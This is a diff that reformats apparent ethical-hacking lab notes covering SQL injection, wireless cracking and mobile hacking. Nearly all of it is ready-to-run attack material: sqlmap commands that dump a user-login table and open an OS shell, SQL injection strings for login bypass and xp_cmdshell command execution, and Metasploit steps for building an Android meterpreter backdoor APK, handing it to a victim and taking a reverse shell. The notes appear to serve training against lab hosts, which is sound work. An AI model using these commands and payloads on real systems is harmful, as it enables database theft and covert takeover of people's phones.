@@ -317,16 +317,25 @@ Module 15 – SQL Injection
 
 ¨ sqlmap
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" –dbs - SQLMAP Extract DBS
+
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope –tables - Extract Tables
+
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login –columns - Extract Columns
+
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login –dump - Dump Data
+
 sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell - OS Shell to execute commands
 
 ¨ Other
-blah' or 1=1 -- - Login bypass
-blah';insert into login values ('john','apple123'); - Insert data into DB from login
-blah';create database mydatabase; - Create database from login
-blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - Execute cmd from login
+
+
+	blah' or 1=1 -- - Login bypass
+
+	blah';insert into login values ('john','apple123'); - Insert data into DB from login
+
+	blah';create database mydatabase; - Create database from login
+
+	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - Execute cmd from login
   
 --------------------------------------------------------------------------  
 Module 16 – Hacking Wireless Networks  
@@ -336,18 +345,30 @@ aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'
 --------------------------------------------------------------------------  
 Module 17 – Hacking Mobile
 ¨ Metasploit – Binary payloads
-> service postgresql start 
-> msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R > Desktop/Backdoor.apk - This command creates an APK backdoor on Desktop under the Root directory. 10.10.10.13 is the IP of Parrot. 
-> share the file
-> msfconsole
-> use exploit/multi/handler
-> set payload android/meterpreter/reverse_tcp and press Enter.
-> set LHOST 10.10.10.13 and press Enter.
-> Type show options to see if Listenning port is 4444.
-> exploit -j -z  - this command will run the exploit as a background job. 
-> session -i 1 - 1 specifies the number of the session of the Meterpreter shell that is launched. 
-> cd /sdcard 
-> ps – shows the running process 
+
+	> service postgresql start 
+
+	> msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R > Desktop/Backdoor.apk - This command creates an APK backdoor on Desktop under the Root directory. 10.10.10.13 is the IP of Parrot. 
+
+	> share the file
+
+	> msfconsole
+
+	> use exploit/multi/handler
+
+	> set payload android/meterpreter/reverse_tcp and press Enter.
+
+	> set LHOST 10.10.10.13 and press Enter.
+
+	> Type show options to see if Listenning port is 4444.
+
+	> exploit -j -z  - this command will run the exploit as a background job. 
+
+	> session -i 1 - 1 specifies the number of the session of the Meterpreter shell that is launched. 
+
+	> cd /sdcard 
+
+	> ps – shows the running process 
 
 ¨ PhoneSploit – Exploit through ADB  
 > cd PhoneSploit 
